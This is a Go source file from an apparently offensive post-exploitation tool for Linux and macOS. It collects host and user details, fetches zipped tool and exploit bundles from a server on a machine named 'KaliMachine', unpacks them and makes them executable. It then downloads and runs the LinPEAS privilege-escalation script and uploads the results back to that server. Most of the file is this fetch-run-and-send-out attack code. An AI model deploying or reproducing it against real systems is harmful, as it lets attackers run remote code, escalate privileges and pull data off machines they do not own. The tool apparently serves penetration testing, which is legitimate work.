//go:build linux || darwin

package cmd

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"

	"github.com/wille/osutil"
)

func GetOSDetails() {
	// Get OS version, current user, privileges, IP address and Hostname and assign these to the variables in variables.go
	OS = fmt.Sprintf("%s %s [%s] %s", osutil.GetDist().Display, osutil.GetDist().Release, osutil.GetDist().Codename, osutil.GetDisplayArch())

	currentUser, _ := user.Current()
	CurrentUser = currentUser.Username
	CurrentGroups = getUserGroups(currentUser)
	HostName, _ = os.Hostname()
	IPAddress, _ = GetLocalIP()
}

func getUserGroups(currUser *user.User) []string {

	var Groups []string

	// Lookup user groups by id
	groups, err := currUser.GroupIds()
	if err != nil {
		Log.Errorf("Error getting user groups: %v\n", err)
	} else {
		// Loop through groups and get the group name
		for _, group := range groups {
			g, err := user.LookupGroupId(group)
			if err != nil {
				Log.Errorf("Error getting group name: %v\n", err)
			} else {
				// Add Group name to list
				Groups = append(Groups, g.Name)
			}
		}
	}
	return Groups
}

func CheckShare() {
	url := fmt.Sprintf("http://%s:%d/", KaliMachine, UploadServerPort)
	UploadServerFull = url
	resp, err := http.Get(url)
	if err != nil {
		UploadServerStatus = "Error"
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		UploadServerStatus = "OK"
		return
	} else {
		UploadServerStatus = string(resp.StatusCode)
		return
	}
}

func createDirIfNotExist(dir string) {
	if _, errdir := os.Stat(dir); os.IsNotExist(errdir) {
		err := os.MkdirAll(dir, 0755)
		if err != nil {
			Log.Errorf("Error creating directory: %v\n", err)
			return
		}
	}
}

func CheckWorkspaceDirectories() {
	createDirIfNotExist(LinuxTempPath)
	createDirIfNotExist(filepath.Join(LinuxTempPath, "tools"))
	createDirIfNotExist(filepath.Join(LinuxTempPath, "exploits"))
}

func SetExecute(dir string) error {
	// Set execute permissions for the file
	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			err := os.Chmod(path, info.Mode()|0111)
			if err != nil {
				return err
			}
			Log.Debugf("Set execute permissions for: %s\n", path)
		}
		return nil
	})
}

func SetExecuteFile(filePath string) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return err
	}

	if info.IsDir() {
		return fmt.Errorf("%s is a directory, not a file", filePath)
	}

	if err := os.Chmod(filePath, info.Mode()|0111); err != nil {
		return err
	}

	fmt.Printf("Set execute flag on: %s\n", filePath)
	return nil
}

func DownloadAllTools() {
	// Description: Download all the tools
	BaseUrl, err := url.Parse(HttpServerFull)

	if err != nil {
		Log.Errorf("Error parsing URL: %v\n", err)
		os.Exit(1)
	}

	linToolsPath, _ := url.QueryUnescape(BaseUrl.JoinPath(LinuxToolsPath, GoHTTPDownloadZip).String())
	linExploitPath, _ := url.QueryUnescape(BaseUrl.JoinPath(LinuxExploitsPath, GoHTTPDownloadZip).String())

	_, err = DownloadFile(linToolsPath, LinuxTempPath, "linux_tools.zip")
	if err != nil {
		Log.Errorf("Error downloading tools: %v\n", err)
		return
	}

	ToolsZipPath := filepath.Join(LinuxTempPath, "linux_tools.zip")

	_, err = DownloadFile(linExploitPath, LinuxTempPath, "linux_exploits.zip")

	if err != nil {
		Log.Errorf("Error downloading exploits: %v\n", err)
		return
	}

	// Unzip the files
	err = UnzipDirToPath(ToolsZipPath, filepath.Join(LinuxTempPath, "tools"))
	if err != nil {
		Log.Errorf("Error unzipping tools: %v\n", err)
		return
	}

	ExploitZipPath := filepath.Join(LinuxTempPath, "linux_exploits.zip")

	err = UnzipDirToPath(ExploitZipPath, filepath.Join(LinuxTempPath, "exploits"))
	if err != nil {
		Log.Errorf("Error unzipping exploits: %v\n", err)
		return
	}

	SetExecute(filepath.Join(LinuxTempPath, "tools/"))
	Log.Info("All tools downloaded")

	err = DeleteZipFiles(ExploitZipPath)
	if err != nil {
		Log.Errorf("Error deleting exploit zip file: %v\n", err)
	}
	err = DeleteZipFiles(ToolsZipPath)
	if err != nil {
		Log.Errorf("Error deleting tools zip file: %v\n", err)
	}
	return
}

func GenerateFileName(fileName string) (string, string) {
	fileName = fmt.Sprintf("%s_%s_%s-%s.txt", IPAddress, HostName, CurrentUser, fileName)
	filePath := filepath.Join(LinuxTempPath, fileName)
	return fileName, filePath
}

func RunPEAS() {
	// Description: Run the PEAS scripts
	Log.Info("Running PEAS Script")
	// Description: Download all the tools
	BaseUrl, err := url.Parse(HttpServerFull)

	if err != nil {
		Log.Errorf("Error parsing URL: %v\n", err)
		os.Exit(1)
	}

	LinPeasPath := BaseUrl.JoinPath(LinuxToolsPath, Linpeas_file)

	Log.Debugf("LinPEAS Path: %s\n", LinPeasPath.String())

	LinPeasBin := filepath.Base(Linpeas_file)
	Log.Debugf("LinPEAS Binary: %s\n", LinPeasBin)

	file, err := DownloadFile(LinPeasPath.String(), LinuxTempPath, LinPeasBin)
	if err != nil {
		fmt.Println(err)
		return
	}
	SetExecuteFile(file)
	_, fileOutPath := GenerateFileName("LinPEAS")
	Log.Infof("Output file: %s", fileOutPath)

	outFile, err := os.Create(fileOutPath)
	if err != nil {
		Log.Errorf("Error creating output file: %v\n", err)
		return
	}
	defer outFile.Close()

	cmd := exec.Command(file, "-a")

	mw := io.MultiWriter(os.Stdout, outFile)
	// write output to file
	cmd.Stdout = mw
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		Log.Errorf("Error running linpeas %s: %v, command: %s", file, err, string(cmd.Path))
	}

	Log.Info("PEAS Script completed")
	// Upload the file to the HTTP Server

	UploadFile(fileOutPath, fmt.Sprintf("%s%s", HttpServerFull, UploadServerFull))
	return
}

func HandleExit() {
	rawModeOff := exec.Command("/bin/stty", "-raw", "echo")
	rawModeOff.Stdin = os.Stdin
	_ = rawModeOff.Run()
	rawModeOff.Wait()
}
